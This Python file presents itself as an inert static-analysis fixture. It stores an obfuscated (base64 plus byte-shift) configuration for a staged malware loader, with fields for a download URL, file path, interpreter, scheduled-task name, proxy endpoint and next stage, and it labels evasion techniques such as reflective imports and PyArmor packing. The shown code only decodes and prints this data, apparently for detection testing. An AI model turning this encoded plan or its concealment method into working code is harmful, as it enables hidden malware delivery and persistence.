# configuration reconstruction
#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_d0683baa = ("YCccZl1eT1pdJ1pcWVBTVk9JUlldXhZLTVtfU1xPSVxPV1leTxZOT01ZTk9JT1dMT05OT04WYVxTXk9JUFNWTxZOU11aS15NUklaXFlNT11dZktOS1peT1wnU1xZWFpjXlJZWEldXmNWT0lSS1hOWVBQZl1eS1FPSU1ZX1heJx9mXWNYXktiJ05TTV5TWVhLXGNJTlNdWkteTVJ"
    "mWUxQX11NS15TWVgnXE9QVk9NXlNgT0lYS1dPSVpWS1hmTUtcXFNPXCdaY0tcV1lcSVpjU1hdXktWVk9cZmFTWE5ZYV1JTVJLU1gnWllhT1xdUk9WVkleWUlaY15SWVhmTUtXWktTUVhJU04nTUtXWktTUVgXHyBOH0wfS1BMHWZfXFYnUl5eWl0kGRkfIE4fTB9LUEwdGE9iS1"
    "daVk8YU1hgS1ZTThlLS00iHU4bIRhaY2ZfXU9cSUtRT1heJzJfWF5cT11dOmNeUllYGR8gTh9MH0tQTB1mUFNWT0laS15SJy0kGTpcWVFcS1cuS15LGTJfWF5cT11dNktMGRhfWk5LXk8XHyBOH0wfS1BMHRhaY2ZTWF5PXFpcT15PXElaS15SJy0kGTpcWVFcS1cuS15LGTpjX"
    "lJZWBcfIE4fTB9LUEwdGVpjXlJZWBhPYk9mXktdVUlYS1dPJz1jXV5PVz9aTkteTxcfIE4fTB9LUEwdZlpcWWJjSU9YTlpZU1heJxscIRgaGBoYGyQdHBwcI2ZYT2JeSV1eS1FPJ1ZZTUtWF05TXVpLXk1SGExLXmZSS1hOWVBQSVNOJzo9OkMXMC4aHCAjGx0wKzAeMCEwIQ==")
CODEC_d0683baa = "base64_chunks|subtract_modulo_256|16"

def load_d0683baa():
    return base64.b64decode(MATERIAL_d0683baa)

def decode_d0683baa(e):
    return bytes((value + 22) % 256 for value in e)

def recover_d0683baa():
    n = (3, 5, 8, 13)[1:3]
    for _pass in range(1):
        d = decode_d0683baa(load_d0683baa())
    t = d.decode("ascii", "strict")
    return t

def inspect_d0683baa():
    stream = io.BytesIO(recover_d0683baa().encode("ascii"))
    return stream.read().decode("ascii")

def surface_d0683baa():
    routes = {"selected": lambda: ("dictionary_dispatch", "reflective_name_plan", "pyarmor_pyinstaller", "powershell_to_python")}
    return routes["selected"]()

def obfuscation_d0683baa():
    reflection_plan = ("__import__", "getattr", "reflective_name_plan")
    return reflection_plan[-1]

def plan_d0683baa():
    fields = dict(item.split("=", 1) for item in inspect_d0683baa().split("|"))
    analysis_surface = surface_d0683baa()
    obfuscation_surface = obfuscation_d0683baa()
    operation_plan = ("ironpython_style_handoff", ("platform",), fields["url"], fields["file_path"], (fields["interpreter_path"], fields["file_path"]), fields["task_name"], fields["proxy_endpoint"], fields["next_stage"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_d0683baa())

# reconstruction complete